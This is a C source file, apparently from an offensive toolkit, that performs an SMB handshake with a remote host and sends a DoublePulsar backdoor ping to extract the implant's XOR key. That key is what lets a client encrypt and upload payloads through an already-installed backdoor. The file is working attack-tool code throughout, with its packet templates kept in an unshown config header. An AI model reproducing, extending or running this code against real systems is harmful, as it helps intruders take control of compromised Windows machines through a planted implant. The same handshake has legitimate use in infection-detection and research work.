#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

static int dp_send_all(SOCKET sock, const unsigned char *data, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        size_t remaining = length - sent;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = send(sock, (const char *)data + sent, chunk, 0);

        if (result == SOCKET_ERROR) {
            if (WSAGetLastError() == WSAEINTR)
                continue;
            return -1;
        }
        if (result == 0)
            return -1;

        sent += (size_t)result;
    }

    return 0;
}

static int dp_recv_exact(SOCKET sock, unsigned char *data, size_t length)
{
    size_t received = 0;

    while (received < length) {
        size_t remaining = length - received;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = recv(sock, (char *)data + received, chunk, 0);

        if (result == SOCKET_ERROR) {
            if (WSAGetLastError() == WSAEINTR)
                continue;
            return -1;
        }
        if (result == 0)
            return -1;

        received += (size_t)result;
    }

    return 0;
}

static int dp_recv_frame(SOCKET sock, unsigned char **frame, size_t *frame_length)
{
    unsigned char header[4];
    unsigned char *buffer;
    size_t payload_length;
    size_t total_length;

    *frame = NULL;
    *frame_length = 0;

    if (dp_recv_exact(sock, header, sizeof(header)) != 0)
        return -1;

    payload_length = ((size_t)header[1] << 16) |
                     ((size_t)header[2] << 8) |
                     (size_t)header[3];
    total_length = sizeof(header) + payload_length;

    buffer = (unsigned char *)malloc(total_length);
    if (buffer == NULL)
        return -1;

    memcpy(buffer, header, sizeof(header));
    if (payload_length != 0 &&
        dp_recv_exact(sock, buffer + sizeof(header), payload_length) != 0) {
        free(buffer);
        return -1;
    }

    *frame = buffer;
    *frame_length = total_length;
    return 0;
}

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    unsigned char negotiate_packet[sizeof(SMB_NEGOTIATE_PKT)];
    unsigned char session_setup_packet[sizeof(SMB_SESSION_SETUP_PKT)];
    unsigned char tree_connect_packet[sizeof(SMB_TREE_CONNECT_PKT)];
    unsigned char ping_packet[sizeof(DP_PING_PKT)];
    unsigned char user_id[2];
    unsigned char tree_id[2];
    unsigned char *response = NULL;
    size_t response_length = 0;
    size_t signature_start;
    size_t signature_end;
    unsigned int xor_key = 0;
    SOCKET sock;

    if (ip == NULL)
        return 0;

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        return 0;

    memcpy(negotiate_packet, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT));
    memcpy(session_setup_packet, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT));
    memcpy(tree_connect_packet, SMB_TREE_CONNECT_PKT, sizeof(SMB_TREE_CONNECT_PKT));
    memcpy(ping_packet, DP_PING_PKT, sizeof(DP_PING_PKT));

    if (dp_send_all(sock, negotiate_packet, sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        dp_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (dp_send_all(sock, session_setup_packet, sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        dp_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;

    if (response_length < 34 || sizeof(tree_connect_packet) < 34)
        goto cleanup;
    user_id[0] = response[32];
    user_id[1] = response[33];
    free(response);
    response = NULL;

    tree_connect_packet[32] = user_id[0];
    tree_connect_packet[33] = user_id[1];
    if (dp_send_all(sock, tree_connect_packet, sizeof(SMB_TREE_CONNECT_PKT) - 1) != 0 ||
        dp_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;

    if (response_length < 30 || sizeof(ping_packet) < 34)
        goto cleanup;
    tree_id[0] = response[28];
    tree_id[1] = response[29];
    free(response);
    response = NULL;

    ping_packet[28] = tree_id[0];
    ping_packet[29] = tree_id[1];
    ping_packet[32] = user_id[0];
    ping_packet[33] = user_id[1];
    if (dp_send_all(sock, ping_packet, sizeof(DP_PING_PKT) - 1) != 0 ||
        dp_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;

    signature_start = (size_t)SMB_RESP_SIGNATURE_START;
    signature_end = (size_t)SMB_RESP_SIGNATURE_END;
    if (signature_end < signature_start ||
        signature_end - signature_start != 4 ||
        signature_end > response_length)
        goto cleanup;

    xor_key = (unsigned int)response[signature_start] |
              ((unsigned int)response[signature_start + 1] << 8) |
              ((unsigned int)response[signature_start + 2] << 16) |
              ((unsigned int)response[signature_start + 3] << 24);

cleanup:
    free(response);
    closesocket(sock);
    return xor_key;
}